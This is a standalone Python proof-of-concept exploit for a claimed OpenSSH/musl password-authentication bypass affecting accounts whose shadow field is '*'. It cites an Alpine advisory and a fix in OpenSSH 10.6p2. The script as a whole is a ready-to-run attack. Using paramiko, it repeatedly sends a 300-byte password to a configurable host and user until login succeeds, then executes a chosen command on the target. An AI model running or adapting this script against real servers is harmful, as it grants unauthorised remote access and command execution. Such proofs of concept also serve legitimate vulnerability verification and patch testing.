#!/usr/bin/env python3
"""
Generic PoC: musl/OpenSSH "*" password-authentication bypass
(Alpine advisory 2026-11-05, fixed in OpenSSH 10.6p2).

An account whose /etc/shadow password field is "*" and that is served by a
musl sshd without PAM accepts ANY password of 257..1024 bytes.  The password
is sent twice on the same connection: the first try primes xcrypt()'s static
pick_salt() cache, the second succeeds.

Adjust the four variables below and run:
    python3 poc.py
"""

# ---- edit these ----------------------------------------------------------
HOST = "192.168.123.100"   # OpenSSH server address
PORT = 22                  # OpenSSH server port
USER = "ciota"             # target account (shadow field must be '*')
COMMAND = "id"             # command to run once authenticated
# --------------------------------------------------------------------------

import os
import sys
import time

try:
    import paramiko
except ImportError:  # paramiko lives in ./.venv; re-exec there if needed
    _venv = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".venv", "bin", "python")
    if os.path.exists(_venv) and os.path.abspath(sys.executable) != os.path.abspath(_venv):
        os.execv(_venv, [_venv] + sys.argv)
    raise

PASSWORD = "A" * 300        # any 257..1024 byte string works
MAX_ATTEMPTS = 5            # first attempt fails, second logs in


def main():
    # Connect (retry a few times: sshd may throttle rapid reconnects).
    for _ in range(15):
        try:
            transport = paramiko.Transport((HOST, PORT))
            transport.banner_timeout = 30
            transport.start_client(timeout=30)
            break
        except Exception:
            time.sleep(4)
    else:
        raise SystemExit(f"cannot connect to {HOST}:{PORT}")

    print(f"[*] {USER}@{HOST}:{PORT} with a {len(PASSWORD)}-byte password")

    # Send the long password until accepted (attempt 2 on a fresh connection).
    for attempt in range(1, MAX_ATTEMPTS + 1):
        try:
            transport.auth_password(USER, PASSWORD)
        except paramiko.AuthenticationException:
            print(f"[-] attempt {attempt}: rejected")
            continue
        print(f"[+] authenticated on attempt {attempt}")
        break
    else:
        transport.close()
        raise SystemExit("[-] authentication failed")

    # Run the command.
    channel = transport.open_session()
    channel.exec_command(COMMAND)
    stdout = channel.makefile("rb", -1).read().decode(errors="replace")
    stderr = channel.makefile_stderr("rb", -1).read().decode(errors="replace")
    status = channel.recv_exit_status()
    channel.close()
    transport.close()

    sys.stdout.write(stdout)
    sys.stderr.write(stderr)
    return status


if __name__ == "__main__":
    sys.exit(main())

